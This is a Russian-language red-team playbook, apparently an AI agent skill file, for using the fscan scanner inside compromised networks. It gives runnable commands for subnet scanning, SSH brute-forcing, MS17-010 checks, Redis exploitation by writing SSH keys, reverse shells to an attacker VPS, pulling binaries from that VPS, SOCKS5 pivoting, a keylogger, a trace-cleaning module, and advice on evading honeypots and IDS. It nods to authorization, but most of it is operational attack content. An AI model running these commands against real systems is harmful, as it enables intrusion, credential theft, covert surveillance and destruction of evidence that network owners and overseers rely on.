# fscan (комплексное сканирование внутренней сети, слабые пароли и уязвимости)

`fscan` = **обзор внутренней сети в ширину**: отдаёте ему подсеть C — за минуты получаете живые хосты, открытые порты, фингерпринты сервисов, заголовки Web,
слабые пароли, доступ без авторизации, критичные уязвимости. **Шумит сильно**, годится только для внутренней сети (для интернет-целей — навык внешнего сканирования).

## Разделение с gogo

| | fscan | gogo |
| --- | --- | --- |
| Назначение | Комплексный обзор + брутфорс + эксплуатация | Высокопроизводительное картирование + фингерпринт + извлечение данных |
| Шум | Сильный (по умолчанию 600 потоков + брутфорс + POC) | Управляемый (`--opsec`, сам настраивает потоки/таймауты) |
| Что запускать первым | Цель ясна, нужно быстро найти слабые пароли и дыры | Сначала развернуть поверхность большого сегмента, нужны фингерпринты и title |

**Рекомендуемый порядок**: сначала `gogo` разворачивает поверхность и даёт список активов → затем `fscan` делает точечный брутфорс и поиск уязвимостей по подтверждённо живым целям.

## Бинарники

```
эта машина : $DSH_HOME/redteam/toolkit/fscan/fscan          (v2.2.1, с локальными плагинами)
       $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
       $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
VPS  : http://<IP_вашего_VPS>:9100/fscan                     (каталог payload из навыка vps-reverse-shell)
```

Установочный скрипт скачивает только `fscan` для linux/amd64. Файлы для Windows и ARM нужно добавить самостоятельно; на текущей платформе используется только основной файл выше.

**Передача на прыжковый хост/цель** (сканирование внутренней сети выполняется оттуда, откуда сеть достижима):

```bash
# скачать прямо на прыжковом хосте (сервис payload на VPS: ~/.dsh/redteam/toolkit/vps/vps.sh serve 9100)
curl -o fscan http://<IP_вашего_VPS>:9100/fscan && chmod +x fscan
# либо загрузить с этой машины через shells
```

## Дисциплина (прочтите первым)

1. **Область**: только подсети из авторизованного перечня; через `-eh/-ehf` явно исключайте офисную сеть, принтеры, АСУ ТП, метаданные облака (169.254.169.254).
2. **Не уроните оборудование**: `-t 600` по умолчанию опасен для старого оборудования и АСУ ТП. Начните с `-t 100 -time 3` и увеличивайте, убедившись, что держит.
3. **Сначала без брутфорса, потом брутфорс**: первый проход `-nobr -nopoc` — только поверхность активов; второй проход с брутфорсом — после подтверждения важности цели и авторизации.
4. **Обходите honeypot/IDS**: `-rate` ограничивает скорость, `-maxpkts` — объём; администратор может смотреть.
5. **Вынос через DNSLog**: `-dns -domain <ваш_dnslog-домен>`, не передавайте чувствительные данные через публичный DNSLog.

## Стандартный порядок работ (SOP)

```bash
# 0) понять, где мы и куда достаём
ip a; ip route

# 1) обзор живости (быстрее всего, сначала очертить живые хосты)
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) поверхность активов (без брутфорса и POC, самый тихий режим)
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) приоритет Web: web-порты из assets.txt передать в этап скриншотов и фингерпринта
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) точечный брутфорс (после подтверждения авторизации)
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5

# 5) критичные уязвимости и доступ без авторизации
./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
```

## Краткий справочник параметров (проверено на v2.2.1 `-help`)

**Цели**
```
-h  <IP|CIDR|файл|домен>   цель (принимает и файл с диапазонами IP)
-hf <file>                файл хостов        -eh/-ehf  исключить хост/исключить файл
-u  <URL>  -uf <file>     один URL / файл URL     -domain <домен>
```

**Порты и живость**
```
-p  21,22,80,443,3306,6379,10000-10100    порты (по умолчанию около 150 частых портов)
-pf <file>  файл портов        -ep исключить порты
-np         отключить ping-пробу (только порты, быстро)      -ao  только проверка живости
-nsp        отключить предварительный отсев подсетей (ускоряет большие сегменты)          -ntp отключить дополнительную TCP-пробу
```

**Режимы**
```
-m all        полный конвейер по умолчанию (с брутфорсом и POC)
-m icmp       только живость
-m <плагин>   запускать только указанный плагин сервиса, например -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
-nobr         без брутфорса   -nopoc без POC   -noredis без эксплуатации Redis
```

**Параллельность и троттлинг** (важно для OPSEC)
```
-t 600       потоков сканирования портов        -time 3   таймаут порта (с)
-mt 20       потоков модуля            -wt 5     таймаут Web
-gt 0        глобальный таймаут (с)        -retry 3  число повторов
-rate 0      максимум пакетов в минуту (0=без ограничения)   -maxpkts 0  общий предел пакетов
-num 20      параллельность POC            -icmp-rate 0.1  скорость ICMP
```

**Учётные данные (брутфорс)**
```
-user/-pwd      одна пара логин/пароль          -userf/-pwdf  файлы словарей
-upf            файл пар «логин:пароль»     -usera/-pwda  добавить несколько (через запятую/пробел)
-hash/-hashf    перебор NTLM Hash        -sshkey       вход по приватному ключу
```

**Эксплуатация (есть — используйте, соблюдая границы авторизации)**
```
-rf <pubkey>        запись открытого ключа в Redis (запись authorized_keys → SSH)
-rs                Redis Shell        -rwc/-rwf/-rwp  запись в Redis содержимого/файла/пути
-rsh <ip:port>     reverse Shell на указанный адрес (совместно с навыком vps-reverse-shell)
-sc <shellcode>    ShellCode для MS17-010
-local <plugin>    локальные плагины: systeminfo / keylogger / cleaner и др. (запускать на прыжковом хосте)
-start-socks5 1080 поднять SOCKS5 на прыжковом хосте и выставить внутреннюю сеть этой машине
-fsh-port 4444     порт сервиса прямого (bind) Shell
```

**Прокси (основной режим после поднятия туннеля)**
```
-socks5 127.0.0.1:1080                 через SOCKS5 (подойдут suo5 / ssh -D / frp)
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           через HTTP-прокси
```

**Вывод**
```
-o result.txt    файл вывода        -f txt|json|csv   формат
-no              не сохранять результат      -silent  тихий режим     -nocolor/-nopg  без цвета/прогресс-бара
-lang zh|en      язык            -log "base,info,success"   уровень логирования
-dns             писать DNS-лог (вместе с -domain для детекта выноса)
-perf            вывести статистику производительности в JSON
```

## Ключевые сценарии

### 1. Работа по внутренней сети через туннель (самое частое)

```bash
# предусловие: уже есть socks5 (навык suo5-tunnel или ssh -D из vps-reverse-shell)
# проверено на практике: fscan -socks5 действительно заводит трафик в туннель
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

Внимание: через прокси не задирайте потоки (узкое место — сам туннель), значения около `-t 50` достаточно.

### 2. Поднять туннель на прыжковом хосте для этой машины

Выполняется на прыжковом хосте (выставить 10-сегмент внутренней сети на порт 9100 VPS, затем пробросить обратно локальным ssh):

```bash
./fscan -start-socks5 1080      # прыжковый хост:1080 становится SOCKS5
# обратный туннель на VPS: ssh -R 9200:127.0.0.1:1080 ubuntu@<IP_вашего_VPS>
# с этой машины: ssh -L 1080:127.0.0.1:9200 ubuntu@<IP_вашего_VPS>
# дальше все инструменты могут работать с -socks5 127.0.0.1:1080
```

### 3. Получить права напрямую через Redis

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # записать открытый ключ → войти по ssh
./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis Shell
./fscan -h 10.0.0.5 -p 6379 -rsh <IP_вашего_VPS>:9000              # reverse на слушатель на VPS
```

### 4. После закрепления на сервере

```bash
./fscan -local systeminfo        # информация о системе, переменные окружения, контроллер домена, сетевые интерфейсы
./fscan -local keylogger         # клавиатурный логгер (-keylog-output задаёт файл вывода)
./fscan -local cleaner           # очистка следов
```

## Запись результатов в базу (обязательно)

Текстовый вывод fscan разбит на секции: разберите его и вносите записи по одной:

```bash
# каждый живой хост
redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
# каждый открытый порт/сервис
redteam_asset_add  { engagement, ip, port, service, banner }   # либо связать через asset_link
# учётные данные и доступ, полученные брутфорсом или через отсутствие авторизации
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<сегмент>.txt" }
redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
# подтверждённые уязвимости (обязательно с http_evidence или равнозначным доказательством)
redteam_vuln_add   { engagement, target, name: "несанкционированный доступ к Redis", severity: "high", evidence_ref }
```

**Дисциплина**: файл вывода `-o` — это доказательство, копируйте его в `runs/`; посмотреть один раз в терминале недостаточно.

## Устранение проблем

| Симптом | Что делать |
| --- | --- |
| Не сканируется/очень медленно | убрать `-np`, снизить `-t`, увеличить `-time`; для больших сегментов сначала `-m icmp` очертить живые хосты |
| Всё выглядит открытым | в промежутке firewall или балансировщик отвечает SYN-ACK: увеличьте `-time` и перепроверьте `-retry` |
| ICMP не работает | нужен root/`CAP_NET_RAW`; используйте `sudo ./fscan -m icmp` либо `-np` и только порты |
| Брутфорс блокирует аккаунт | сначала небольшим `-usera`, убедитесь, что нет политики блокировки (доменные аккаунты особенно опасны) |
| Кракозябры вместо китайского вывода | `-lang en` или `export LANG=zh_CN.UTF-8` |
| Нужно тише | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`, при необходимости `-silent` |
